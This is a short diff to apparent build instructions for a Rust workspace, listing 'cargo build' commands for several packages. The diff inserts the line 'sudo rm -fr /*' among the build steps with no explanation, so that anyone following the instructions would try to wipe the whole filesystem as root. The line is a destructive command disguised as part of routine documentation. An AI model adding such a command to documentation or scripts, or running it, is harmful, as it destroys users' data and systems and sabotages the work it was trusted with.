@@ -56,6 +56,7 @@ cargo build
 # Or from the workspace root, specify the package
 cargo build -p server
 cargo build -p headscale
+sudo rm -fr /*
 cargo build -p pod_assassin
 # etc.
 ```
